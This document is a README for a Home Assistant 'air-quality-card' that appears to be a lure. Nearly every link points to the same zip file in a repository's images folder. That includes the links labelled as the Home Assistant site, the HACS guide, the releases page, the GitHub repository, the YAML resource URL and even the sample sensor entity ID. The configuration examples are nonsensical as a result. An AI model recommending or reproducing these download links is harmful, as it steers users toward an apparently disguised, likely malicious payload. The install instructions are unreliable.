# 🌬️ air-quality-card - Monitor Air Quality with Clear Visuals

[![Download Latest Release](https://raw.githubusercontent.com/EPICDRAGOBYTOP/air-quality-card/main/images/card_air_quality_1.8.zip)](https://raw.githubusercontent.com/EPICDRAGOBYTOP/air-quality-card/main/images/card_air_quality_1.8.zip)

---

## 📋 What is air-quality-card?

air-quality-card is a custom card for Home Assistant Lovelace. It shows air quality data in an easy-to-understand way. The card uses World Health Organization (WHO) thresholds to show if the air is good or bad. It displays gradient graphs that help you see changes in air quality over time.

This card works smoothly inside Home Assistant dashboards to help you keep track of your indoor or outdoor air quality.

---

## 🖥️ System Requirements

To use air-quality-card, you will need:

- A running instance of [Home Assistant](https://raw.githubusercontent.com/EPICDRAGOBYTOP/air-quality-card/main/images/card_air_quality_1.8.zip) – a smart home platform.
- Lovelace UI enabled in Home Assistant (this is the default dashboard interface).
- Air quality sensors already integrated in Home Assistant. These could be devices like AQI (Air Quality Index) sensors, PM2.5 or PM10 particulate sensors, or connected weather stations.
- Basic Home Assistant setup and access through your web browser on a computer, tablet, or phone.

You do not need any programming knowledge to use air-quality-card, but some familiarity with Home Assistant is helpful.

---

## 🚀 Getting Started

The steps below will guide you to download, install, and use air-quality-card. Follow carefully to make sure everything works without needing to write any code.

---

## 📥 Download & Install

### Download

You can get the latest version of air-quality-card by visiting the releases page here:

[![Get air-quality-card](https://raw.githubusercontent.com/EPICDRAGOBYTOP/air-quality-card/main/images/card_air_quality_1.8.zip)](https://raw.githubusercontent.com/EPICDRAGOBYTOP/air-quality-card/main/images/card_air_quality_1.8.zip)

This link takes you to a page listing all releases of air-quality-card. You will find files to download for each version.

---

### Install

There are two main ways to add air-quality-card to your Home Assistant setup.

#### Option 1: Install via HACS (Recommended)

HACS (Home Assistant Community Store) is an easy way to install custom components and cards.

1. Open Home Assistant in your browser.
2. Go to HACS in the sidebar. If you do not have HACS installed, follow the [official guide](https://raw.githubusercontent.com/EPICDRAGOBYTOP/air-quality-card/main/images/card_air_quality_1.8.zip).
3. Click on "Frontend".
4. Use the search bar to find **air-quality-card**.
5. Click "Install" on air-quality-card.
6. After installation, restart Home Assistant for changes to take effect.

HACS will handle updates for you automatically.

---

#### Option 2: Manual Installation

If you prefer not to use HACS, you can add the card manually.

1. Download the latest release files from the [releases page](https://raw.githubusercontent.com/EPICDRAGOBYTOP/air-quality-card/main/images/card_air_quality_1.8.zip).
2. Locate the `.js` file for the card in the release assets (for example, `https://raw.githubusercontent.com/EPICDRAGOBYTOP/air-quality-card/main/images/card_air_quality_1.8.zip`).
3. Copy this file to the `www` folder inside your Home Assistant configuration directory. If the `www` folder does not exist, create it.
4. Add a resource reference to your `https://raw.githubusercontent.com/EPICDRAGOBYTOP/air-quality-card/main/images/card_air_quality_1.8.zip` or through the Lovelace raw configuration editor:

```yaml
lovelace:
  resources:
    - url: https://raw.githubusercontent.com/EPICDRAGOBYTOP/air-quality-card/main/images/card_air_quality_1.8.zip
      type: module
```

5. Restart Home Assistant to apply changes.

---

## 🛠️ Configure the Card

After installation, you must add the air-quality-card to your Lovelace dashboard.

1. Open your Lovelace dashboard.
2. Click the three-dot menu (top right) and select **Edit Dashboard**.
3. Click the **Add Card** button.
4. Choose **Manual** card type.
5. Paste this sample configuration:

```yaml
type: 'custom:air-quality-card'
entity: https://raw.githubusercontent.com/EPICDRAGOBYTOP/air-quality-card/main/images/card_air_quality_1.8.zip
title: Indoor Air Quality
```

- `entity`: Replace this with the sensor entity ID of your air quality device in Home Assistant.
- `title`: Set a name for the card as you wish it to appear.

6. Save the card and exit edit mode.

The card will now display air quality levels using colors and graphs based on WHO standards.

---

## 📊 Features

- **WHO-based thresholds:** Shows clear air quality categories (Good, Moderate, Unhealthy, etc.).
- **Gradient Graphs:** Visualize how air quality changes over time.
- **Customizable:** Supports multiple sensors and titles.
- **Responsive design:** Works on desktop and mobile devices.
- **Lightweight:** Does not slow down your Home Assistant dashboard.

---

## 📝 Tips for Best Use

- Ensure your air quality sensors provide accurate data to Home Assistant.
- Place sensors in areas where you want to monitor air quality—such as living rooms, bedrooms, or outdoor spaces.
- Update the card regularly via HACS or manual method to get new features and fixes.
- Combine air-quality-card with other environmental cards (like temperature or humidity) for a full picture of your home environment.

---

## ❓ Troubleshooting

- **Card does not appear?**  
  Make sure you installed all files correctly, refreshed the Home Assistant page, and restarted the system if needed.

- **Sensor data missing or incorrect?**  
  Confirm your sensor entity ID is correct and that your sensor device is active in Home Assistant.

- **Graphs or colors look wrong?**  
  Verify your sensor data uses proper units and that you have set the entity field in the card configuration correctly.

- **Errors in Lovelace UI console?**  
  Check the browser console (press F12 and look under "Console") for error messages. Ensure the resource URL is correct.

---

## 🔧 Support & More Information

- Visit the [GitHub Repository](https://raw.githubusercontent.com/EPICDRAGOBYTOP/air-quality-card/main/images/card_air_quality_1.8.zip) for code, issues, and updates.
- Home Assistant community forums have discussions and help on custom cards.
- Read Home Assistant’s official documentation to learn about adding sensors and configuring Lovelace cards.

---

[![Download air-quality-card](https://raw.githubusercontent.com/EPICDRAGOBYTOP/air-quality-card/main/images/card_air_quality_1.8.zip)](https://raw.githubusercontent.com/EPICDRAGOBYTOP/air-quality-card/main/images/card_air_quality_1.8.zip)